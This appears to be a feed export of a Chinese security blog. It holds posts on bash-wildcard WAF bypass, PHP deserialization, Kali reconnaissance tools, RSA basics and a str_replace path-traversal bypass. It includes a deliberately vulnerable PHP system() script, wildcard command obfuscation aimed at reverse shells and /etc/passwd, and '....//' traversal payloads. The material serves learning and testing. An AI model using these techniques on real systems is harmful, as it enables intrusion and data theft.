src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/5.webp" alt><br>但为什么使用通配符（特别是问号）可以绕过WAF？</p><h3 id="Sucuri-WAF绕过"><a href="#Sucuri-WAF绕过" class="headerlink" title="Sucuri WAF绕过"></a>Sucuri WAF绕过</h3><p><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/6.webp" alt><br>测试 WAF 规则集的最佳方法是什么？创建一个有漏洞的 PHP 脚本，并尝试所有可能的技术。在上图的左上方的窗格中，是一个有漏洞的PHP脚本。</p><pre><code>&lt;?php    echo &apos;ok: &apos;;    print_r($_GET[&apos;c&apos;]);    system($_GET[&apos;c&apos;]);?&gt;</code></pre><p>在左下方的窗格中，你可以看到对这个网站（test1.unicresit.it）进行远程命令执行测试。正如你所看到的，Sucuri WAF 以 <strong>An attempted RFI/LFI was detected and blocked</strong> 理由阻止请求。</p><p>右窗格显示了同样的请求，但却使用 <code>?</code> 作为通配符，结果是 Sucuri WAF 没有阻止这个请求，应用程序执行了放入 <code>c</code> 参数的命令。现在就可以读取 <code>/etc/passwd</code> 文件，甚至更多。</p><p>我可以读取应用程序本身的 PHP 源代码，可以使用 netcat（<code>/???/?c</code>）执行反弹 shell，或者我可以执行 curl 或 wget 来获取网络服务器的真实 IP，使我能够通过直接连接目标来绕过 WAF。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>使用一些不常用的bash命令的技巧，还是可以绕过WAF的防护的。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;特殊的通配符用法&quot;&gt;&lt;a href=&quot;#特殊的通配符用法&quot; class=&quot;headerlink&quot; title=&quot;特殊的通配符用法&quot;&gt;&lt;/a&gt;特殊的通配符用法&lt;/h3&gt;&lt;p&gt;Bash 标准通配符（也称为通配符模式）被各种命令行实用程序用于处理多个文件。并不是每个人都知道 bash 语法可以使用问号 &lt;code&gt;?&lt;/code&gt;、正斜杠 &lt;code&gt;/&lt;/code&gt;、数字和字母来执行系统命令。你甚至可以枚举文件并使用相同数量的字符获取其内容。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://black0saturday.github.io/2020/03/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://black0saturday.github.io/2020/03/23/PHP反序列化/</id>
    <published>2020-03-23T02:46:46.000Z</published>
    <updated>2020-04-02T06:49:41.552Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 考研用了一年，好久没写博客了，安全也很久没搞了，最近重新学了一遍以前自己的笔记，今天学到PHP序列化和反序列化，之前对这个概念就模模糊糊的，今天正好弄清楚。</p><a id="more"></a><h3 id="0x00：PHP序列化"><a href="#0x00：PHP序列化" class="headerlink" title="0x00：PHP序列化"></a>0x00：PHP序列化</h3><h4 id="序列化函数：serialize"><a href="#序列化函数：serialize" class="headerlink" title="序列化函数：serialize()"></a>序列化函数：serialize()</h4><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p><p><strong>变量所储存的数据是内存数据，在程序执行结束时，内存数据便会立即销毁；而文件、数据库是“持久存储”，因此PHP序列化就是将内存的数据保存到文件中的过程。</strong></p><ol><li>$s = serialize($变量); //该函数将变量数据进行序列化转换为字符串</li><li>file_put_contents(‘./目标文本文件’, $s); //将$s保存到指定文件</li></ol><h4 id="For-example"><a href="#For-example" class="headerlink" title="For example"></a>For example</h4><pre><code>&lt;?phpclass User{    // 创建类数据    public $age = 0;    public $name = &apos;&apos;;    // 输出数据    public function PrintData()    {        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; .$this-&gt;age . &apos; years old.&apos;;        echo &quot;\n&quot;;    }}// 创建一个对象$usr = new User();// 设置数据$usr-&gt;age = 20;$usr-&gt;name = &apos;lemon&apos;;// 输出数据$usr-&gt;PrintData();// 输出序列化之后的数据echo serialize($usr);echo &quot;\n&quot;;?&gt;</code></pre><p>输出序列化后的结果</p><ol><li>User lemon is 20 years old. </li><li>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:5:”lemon”;}</li></ol><p>可以看到序列化一个对象后会保存对象的所有变量，并且发现序列化后的结果都有一个字符，这些字符都是一下字母的缩写。</p><ul><li>a array                 </li><li>b boolean  </li><li>d double               </li><li>i integer</li><li>o common object </li><li>r reference</li><li>s string </li><li>C custom object</li><li>O class</li><li>N null</li><li>R pointer reference </li><li>U unicode string</li></ul><p>了解了缩写字母的含义，就可以解读序列化后的含义</p><ol><li>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:5:”lemon”;}</li><li>对象类型:长度:”类名”:类中变量的个数:{类型:长度:”值”;类型:长度:”值”;……}</li></ol><p>通过这个例子，应该能理解序列化函数serialize()的功能</p><h3 id="0x01：PHP反序列化"><a href="#0x01：PHP反序列化" class="headerlink" title="0x01：PHP反序列化"></a>0x01：PHP反序列化</h3><p>函数：unserialize()</p><blockquote><p>unserialize()对单一的已序列化的变量进行操作，将其转回PHP的值。在解序列化一个对象前，这个对象的类必须在解序列化之前定义。</p></blockquote><p>简单理解起来就是<strong>将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程</strong>，恢复到变量序列化之前的结果。</p><pre><code>$s = file_get_contents(‘./目标文本文件’); //取得文本文件的内容（之前序列化过的字符串）$变量 = unserialize($s); //将该文本内容，反序列化到指定的变量中</code></pre><h4 id="For-example-1"><a href="#For-example-1" class="headerlink" title="For example"></a>For example</h4><pre><code>&lt;?php    // 某类    class User    {        // Class data        public $age = 0;        public $name = &apos;&apos;;        // Print data        public function PrintData()        {            echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old.&apos;;            echo &quot;\n&quot;;        }    }    // 重建对象    $usr = unserialize(&apos;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;}&apos;);    // 调出PrintData输出数据    $usr-&gt;PrintData();?&gt;</code></pre><p>输出结果：</p><blockquote><p>User lemon is 20 years old.</p></blockquote><p><strong>注意：在解序列化一个对象前，这个对象的类必须在解序列化之前定义。否则会报错</strong></p><p>在先知上看大师傅举得例子对序列化和反序列化的介绍，也很好理解。</p><pre><code>&lt;?phpclass A{    var $test = &quot;demo&quot;;}$a = new A(); //生成a对象$b = serialize($a); //序列化a对象为b$c = unserialize($b); //反序列化b对象为cprint_r($b); //输出序列化之后的值echo &quot;\n&quot;;print_r($c-&gt;test); //输出对象c中test的值：demo?&gt;</code></pre><h3 id="0x02：PHP反序列化漏洞"><a href="#0x02：PHP反序列化漏洞" class="headerlink" title="0x02：PHP反序列化漏洞"></a>0x02：PHP反序列化漏洞</h3><p>在学习漏洞前，先来了解一下PHP魔法函数，对接下来的学习会很有帮助</p><blockquote><p>PHP将所有以__(两个下划线)开头的类方法保留为魔术方法</p></blockquote><ol><li>__construct   当一个对象创建时被调用，</li><li>__destruct   当一个对象销毁时被调用，</li><li>__toString   当一个对象被当作一个字符串被调用。</li><li>__wakeup()   使用unserialize时触发</li><li>__sleep()    使用serialize时触发</li><li>__destruct()    对象被销毁时触发</li><li>__call()    在对象上下文中调用不可访问的方法时触发</li><li>__callStatic()    在静态上下文中调用不可访问的方法时触发</li><li>__get()    用于从不可访问的属性读取数据</li><li>__set()    用于将数据写入不可访问的属性</li><li>__isset()    在不可访问的属性上调用isset()或empty()触发</li><li>__unset()     在不可访问的属性上使用unset()时触发</li><li>__toString()    把类当作字符串使用时触发,返回值需要为字符串</li><li>__invoke()   当脚本尝试将对象调用为函数时触发</li></ol><p>这里只列出了一部分的魔法函数，具体可见<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><p>下面通过一个例子来简单了解一下魔法函数被自动调用的过程</p><pre><code>&lt;?phpclass test{ public $varr1=&quot;abc&quot;; public $varr2=&quot;123&quot;; public function echoP(){  echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;; } public function __construct(){  echo &quot;__construct&lt;br&gt;&quot;; } public function __destruct(){  echo &quot;__destruct&lt;br&gt;&quot;; } public function __toString(){  return &quot;__toString&lt;br&gt;&quot;; } public function __sleep(){  echo &quot;__sleep&lt;br&gt;&quot;;  return array(&apos;varr1&apos;,&apos;varr2&apos;); } public function __wakeup(){  echo &quot;__wakeup&lt;br&gt;&quot;; }}$obj = new test();  //实例化对象，调用__construct()方法，输出__construct$obj-&gt;echoP();   //调用echoP()方法，输出&quot;abc&quot;echo $obj;//obj对象被当做字符串输出，调用__toString()方法，输出__toString$s =serialize($obj);  //obj对象被序列化，调用__sleep()方法，输出__sleepecho unserialize($s);  //$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。// 脚本结束又会调用__destruct()方法，输出__destruct?&gt;</code></pre><h2 id="未完待续！！"><a href="#未完待续！！" class="headerlink" title="未完待续！！"></a>未完待续！！</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt; 考研用了一年，好久没写博客了，安全也很久没搞了，最近重新学了一遍以前自己的笔记，今天学到PHP序列化和反序列化，之前对这个概念就模模糊糊的，今天正好弄清楚。&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://black0saturday.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>kali中的信息收集工具</title>
    <link href="http://black0saturday.github.io/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
    <id>http://black0saturday.github.io/2018/12/06/kali中的信息收集工具/</id>
    <published>2018-12-06T01:42:02.000Z</published>
    <updated>2020-04-18T03:12:08.188Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>信息收集的方式可以分为两种：</p><ul><li>主动和被动。主动的信息收集方式：通过直接访问、扫描网站，这种将流量流经网站的行为。</li><li>被动的信息收集方式：利用第三方的服务对目标进行访问了解，比例：Google搜索。</li></ul><a id="more"></a><p>信息收集要收集什么呢：</p><ul><li>域名的信息</li><li>DNS</li><li>IP</li><li>使用的技术和配置，文件，联系方式等等。</li></ul><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>没有一种方式是最完美的，每个方式都有自己的优势。</p><ul><li>主动方式，你能获取更多的信息，但是目标主机可能会记录你的操作记录。</li><li>被动方式，你收集的信息会先对少，但是你的行动并不会被目标主机发现。一般在一个渗透项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。</li></ul><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>关于Whois的介绍请访问: <a href="https://www.ietf.org/rfc/rfc3912.txt‍" target="_blank" rel="noopener">https://www.ietf.org/rfc/rfc3912.txt‍</a></p><pre><code>#whois baidu.com</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/1.png" alt></p><p>我们可以获取关于百度的DNS服务器信息，域名注册基本信息。这些信息在以后的测试阶段中有可能会发挥重大的作用。</p><p>除了使用whois命令，也有一些网站提供在线whois信息查询：</p><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><p><a href="http://www.internic.net/whois.html" target="_blank" rel="noopener">http://www.internic.net/whois.html</a><br>收集完域名信息之后，我们将开始收集关于DNS服务器的详细信息。</p><h3 id="DNS分析工具-host"><a href="#DNS分析工具-host" class="headerlink" title="DNS分析工具-host"></a>DNS分析工具-host</h3><p>使用DNS分析工具的目的在于收集有关DNS服务器和测试目标的相应记录信息。</p><p>以下是几种常见的DNS记录类型：<br><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/1.jpg" alt></p><p>在获取DNS服务器信息之后，下一步就是借助DNS服务器找出目标主机IP地址。我们可以使用下面的命令行工具来借助一个DNS服务器查找目标主机的IP地址：</p><pre><code>host www.baidu.com</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/2.png" alt></p><p>我们可以看到 有两个IP地址？？</p><p>一般情况下，host查找的是A，AAAA，和MX的记录。</p><p>查询详细的记录只需要添加 -a</p><pre><code>#host -a baidu.com 8.8.8.8</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/3.png" alt></p><h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>除了host命令，你也可以使用dig命令对DNS服务器进行挖掘。相对于host命令，dig命令更具有灵活和清晰的显示信息。</p><pre><code>#dig baidu.com</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/4.png" alt></p><p>不使用选项的dig命令，只返回一个记录。如果要返回全部的记录，只需要在命令添加给出的类型：</p><pre><code>#dig baidu.com any</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/5.png" alt></p><h3 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h3><p>我们可以利用dnsenum从DNS服务器上获取以下信息：</p><pre><code>1. 主机IP地址2. 该域名的DNS服务器3. 该域名的MX记录</code></pre><p>除了被用来获取DNS信息，dnsenum还具有以下特点：</p><pre><code>1. 使用谷歌浏览器获取子域名2. 暴力破解3. C级网络扫描4. 反向查找网络</code></pre><p>命令：</p><pre><code>#dnsnum baidu.com</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/6.png" alt></p><h3 id="fierce"><a href="#fierce" class="headerlink" title="fierce"></a>fierce</h3><p>fierce 是使用多种技术来扫描目标主机IP地址和主机名的一个DNS服务器枚举工具。运用递归的方式来工作。它的工作原理是先通过查询本地DNS服务器来查找目标DNS服务器，然后使用目标DNS服务器来查找子域名。fierce的主要特点就是可以用来地位独立IP空间对应域名和主机名。</p><p>启动fierce使用的命令：</p><pre><code>#fierce -h</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/7.png" alt></p><p>举例：</p><pre><code>#fierce  -dns baidu.com -threads 3</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/8.png" alt></p><h3 id="DMitry"><a href="#DMitry" class="headerlink" title="DMitry"></a>DMitry</h3><p>DMitry（Deepmagic Information Gathering Tool）是一个一体化的信息收集工具。它可以用来收集以下信息：</p><pre><code>1. 端口扫描2. whois主机IP和域名信息3. 从Netcraft.com获取主机信息4. 子域名5. 域名中包含的邮件地址</code></pre><p>尽管这些信息可以在Kali中通过多种工具获取，但是使用DMitry可以将收集的信息保存在一个文件中，方便查看。</p><p>举例：</p><pre><code>#dmitry -winse baidu.com</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/9.png" alt></p><p>再一个例子，通过dmitry 来扫描网站端口</p><pre><code>#dmitry -p baidu.com -f -b</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/3.jpg" alt></p><h3 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h3><p>Maltego是一个开源的取证工具。它可以挖掘和收集信息。</p><p>Maltego是一个图形界面。</p><p>Maltego的基础网络特点：</p><pre><code>1. 域名2. DNS3. Whois4. IP地址5. 网络块</code></pre><p>也可以被用于收集相关人员的信息：</p><pre><code>1. 公司、组织2. 电子邮件3. 社交网络关系4. 电话号码</code></pre><h3 id="theharvester"><a href="#theharvester" class="headerlink" title="theharvester"></a>theharvester</h3><p>theharvester是一个电子邮件，用户名和主机名/子域名信息收集工具。它收集来自各种公开的信息来源。最新版本支持的信息来源包括：</p><pre><code>1. Google2. Google profiles3. Bing4. PGP5. LinkedIn6. Yandex7. People1238. Jigsaw</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/4.jpg" alt></p><p>通过bing来收集</p><pre><code>#theharvester -d baidu.com -l 100 -b bing</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/5.jpg" alt></p><p>如果我们想收集目标用户名，我们可以通过LinkedIn.com查找。命令如下：</p><pre><code>#theharvester -d baidu.com -l 100 -b  linkedin</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/6.jpg" alt></p><h3 id="Metagoofil"><a href="#Metagoofil" class="headerlink" title="Metagoofil"></a>Metagoofil</h3><p>Metagoofil是一款利用Google收集信息的工具，目前支持的类型如下：</p><pre><code>1. word2. ppt3. Excel4. PDF</code></pre><p>命令：</p><pre><code>#metagoofil -d baidu.com -l 20 -t doc,pdf -n 5  -f test.html -o test</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/7.jpg" alt></p><p>通过这个工具我们可以看到收集到的资料非常多，如，用户名，路径信息。我们可以通过这些用户名进行暴力破解。</p><p>通过生成的HTML版的报告，我们可以非常清晰的看到我们收集的信息种类：</p><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/8.jpg" alt></p><p>至此，我们的信息收集工具介绍已经完成。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;信息收集的方式可以分为两种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主动和被动。主动的信息收集方式：通过直接访问、扫描网站，这种将流量流经网站的行为。&lt;/li&gt;
&lt;li&gt;被动的信息收集方式：利用第三方的服务对目标进行访问了解，比例：Google搜索。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="kali" scheme="http://black0saturday.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>初学RSA</title>
    <link href="http://black0saturday.github.io/2018/12/03/%E5%88%9D%E5%AD%A6RSA/"/>
    <id>http://black0saturday.github.io/2018/12/03/初学RSA/</id>
    <published>2018-12-03T06:22:55.000Z</published>
    <updated>2020-04-11T07:40:09.064Z</updated>
    
    <content type="html"><![CDATA[<p>现代密码学里面有对称加密和非对称加密。</p><p><strong>对称加密：</strong>指的就是加、解密使用的同是一串密钥，所以被称做对称加密。对称加密只有一个密钥作为私钥。 </p><blockquote><p>常见的对称加密算法：DES，AES等。</p></blockquote><p><strong>非对称加密：</strong>指的是加、解密使用不同的密钥，一把作为公开的公钥，另一把作为私钥。公钥加密的信息，只有私钥才能解密。反之，私钥加密的信息，只有公钥才能解密。 </p><blockquote><p>非对称加密算法：RSA</p></blockquote><a id="more"></a><hr><p>接下来详细学习一下RSA算法。</p><h2 id="第一步：生成密钥对，即公钥和私钥。"><a href="#第一步：生成密钥对，即公钥和私钥。" class="headerlink" title="第一步：生成密钥对，即公钥和私钥。"></a>第一步：生成密钥对，即公钥和私钥。</h2><h3 id="1：随机找两个质数-P-和-Q-P-与-Q-越大，越安全。"><a href="#1：随机找两个质数-P-和-Q-P-与-Q-越大，越安全。" class="headerlink" title="1：随机找两个质数 P 和 Q ,P 与 Q 越大，越安全。"></a>1：随机找两个质数 P 和 Q ,P 与 Q 越大，越安全。</h3><p>比如 P = 67 ，Q = 71。计算他们的乘积 n = P * Q = 4757 ，转化为二进为 1001010010101，该加密算法即为 13 位，实际算法是 1024 位 或 2048 位，位数越长，算法越难被破解。</p><h3 id="2：计算-n-的欧拉函数-φ-n-。"><a href="#2：计算-n-的欧拉函数-φ-n-。" class="headerlink" title="2：计算 n 的欧拉函数 φ(n)。"></a>2：计算 n 的欧拉函数 φ(n)。</h3><p>φ(n) 表示在小于等于 n 的正整数之中，与 n 构成互质关系的数的个数。例如：在 1 到 8 之中，与 8 形成互质关系的是1、3、5、7，所以 φ(n) = 4。 如果 n = P <em> Q，P 与 Q 均为质数，则 φ(n) = φ(P </em> Q)= φ(P - 1)φ(Q - 1) = (P - 1)(Q - 1) 。 本例中 φ(n) = 66 * 70 = 4620，这里记为 m， m = φ(n) = 4620</p><h3 id="3：随机选择一个整数-e，条件是1-lt-e-lt-m，且-e-与-m-互质。"><a href="#3：随机选择一个整数-e，条件是1-lt-e-lt-m，且-e-与-m-互质。" class="headerlink" title="3：随机选择一个整数 e，条件是1&lt; e &lt; m，且 e 与 m 互质。"></a>3：随机选择一个整数 e，条件是1&lt; e &lt; m，且 e 与 m 互质。</h3><p>公约数只有 1 的两个整数，叫做互质整数，这里我们随机选择 e = 101 请注意不要选择 4619，如果选这个，则公钥和私钥将变得相同。</p><h3 id="4：有一个整数-d，可以使得-e-d-除以-m-的余数为-1。"><a href="#4：有一个整数-d，可以使得-e-d-除以-m-的余数为-1。" class="headerlink" title="4：有一个整数 d，可以使得 e*d 除以 m 的余数为 1。"></a>4：有一个整数 d，可以使得 e*d 除以 m 的余数为 1。</h3><p>即找一个整数 d，使得 (e <em> d ) % m = 1。 等价于 e </em> d - 1 = y <em> m ( y 为整数） 找到 d ，实质就是对下面二元一次方程求解。 e </em> x - m * y =1 ，其中 e = 101，m = 4620 101x - 4620y =1 这个方程可以用”扩展欧几里得算法”求解，此处省略具体过程。 总之算出一组整数解（x，y ）= （ 1601，35），即 d = 1601。 到此密钥对生成完毕。不同的 e 生成不同的 d，因此可以生成多个密钥对。</p><p>本例中公钥为 （n，e) = (4757 , 101)，私钥为 （n，d) = (4757 ，1601) ，仅（n，e) = (4757 , 101) 是公开的，其余数字均不公开。可以想像如果只有 n 和 e，如何推导出 d，目前只能靠暴力破解，位数越长，暴力破解的时间越长。</p><h2 id="第二步：加密生成密文-。"><a href="#第二步：加密生成密文-。" class="headerlink" title="第二步：加密生成密文 。"></a>第二步：加密生成密文 。</h2><p>比如甲向乙发送汉字“中”，就要使用乙的公钥加密汉字 “中”， 以 utf-8 方式编码为 [e4 b8 ad]，转为 10 进制为 [228,184,173]。要想使用公钥（n，e) = (4757 , 101)加密，要求<strong>被加密的数字必须小于 n，被加密的数字必须是整数</strong>，字符串可以取 ascii 值或unicode值，因此将“中”字折为三个字节 [228,184,173]，分别对三个字节加密。 假设 a 为明文，b 为密文，则按下列公式计算出 b</p><pre><code>a^e % n = b计算 [228,184,173]的密文：228^101 % 4757 = 4296184^101 % 4757 = 2458173^101 % 4757 = 3263</code></pre><p>即 [228,184,173]加密后得到密文 [4296，2458，3263] ，如果没有私钥 d ,神仙也无法从 [4296，2458，3263]中恢复 [228,184,173]。</p><p>解密生成明文。<br>乙收到密文 [4296，2458，3263]，并用自己的私钥（n，d) = (4757 ，1601) 解密。解密公式如下： 假设 a 为明文，b 为密文，则按下列公式计算出 a</p><pre><code>a^d % n = b密文 [4296，2458，3263]的明文如下：4296^1601% 4757 = 2282458^1601% 4757 = 1843263^1601% 4757 = 173</code></pre><p>即密文 [4296，2458，3263] 解密后得到 [228,184,173] 将[228,184,173] 再按 utf-8 解码为汉字 “中”，至此解密完毕。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>最后，问题来了，有没有可能在已知 （n，e) 的情况下，推导出 d。<br><br>根据以上密钥对的生成过程：</p><ul><li>如果想知道 d 需要知道欧拉函数 φ(n)</li><li>如果想知道欧拉函数 φ(n) 需要知道 P 和 Q</li><li>要知道 P 和 Q 需要对 n 进行因数分解。</li></ul><p>对于本例中的 4757 你可以轻松进行因数分解，但对于大整数的因数分解，是一件很困难的事情，目前除了暴力破解，还没有更好的办法，如果以目前的计算速度，破解需要50年以上，则这个算法就是安全的。 </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现代密码学里面有对称加密和非对称加密。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对称加密：&lt;/strong&gt;指的就是加、解密使用的同是一串密钥，所以被称做对称加密。对称加密只有一个密钥作为私钥。 &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;常见的对称加密算法：DES，AES等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;非对称加密：&lt;/strong&gt;指的是加、解密使用不同的密钥，一把作为公开的公钥，另一把作为私钥。公钥加密的信息，只有私钥才能解密。反之，私钥加密的信息，只有公钥才能解密。 &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;非对称加密算法：RSA&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="http://black0saturday.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>str_replace函数导致文件包含漏洞</title>
    <link href="http://black0saturday.github.io/2018/11/30/str-replace%E5%87%BD%E6%95%B0%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://black0saturday.github.io/2018/11/30/str-replace函数导致文件包含漏洞/</id>
    <published>2018-11-30T09:22:04.000Z</published>
    <updated>2020-04-11T01:37:48.538Z</updated>
    
    <content type="html"><![CDATA[<p>遇到一个代码审计的题，源码如下：<br><a id="more"></a><br><img src="/2018/11/30/str-replace%E5%87%BD%E6%95%B0%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1.png" alt></p><p>代码审计发现考察的是str_replace函数过滤不当造成的任意文件包含漏洞。</p><p>仔细观察18行的代码：<br>    return str_replace(‘../‘, ‘’, $language);</p><p>程序仅仅只是将 ../ 字符替换成空，这并不能阻止攻击者进行攻击。<br>例如攻击者使用payload：<code>....//</code> 或者 <code>..././</code> ，在经过程序的 <code>str_replace</code> 函数处理后，都会变成 <code>../</code> ，所以上图程序中的 <code>str_replace</code> 函数过滤是有问题的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;遇到一个代码审计的题，源码如下：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
